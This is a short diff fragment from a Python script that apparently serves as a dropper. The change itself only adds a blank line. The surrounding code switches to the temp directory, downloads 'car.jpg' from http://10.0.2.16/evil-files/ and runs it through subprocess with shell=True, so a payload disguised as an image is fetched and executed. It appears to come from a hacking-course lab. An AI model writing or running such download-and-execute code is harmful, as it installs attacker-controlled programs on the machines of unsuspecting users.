@@ -13,6 +13,7 @@ def download(url):
 
 temp_directory = tempfile.gettempdir() # Get the temporary directory
 os.chdir(temp_directory) # Change the current working directory to the temporary directory
+
 download("http://10.0.2.16/evil-files/car.jpg")
 subprocess.Popen("car.jpg", shell=True) # Open the downloaded image file
 
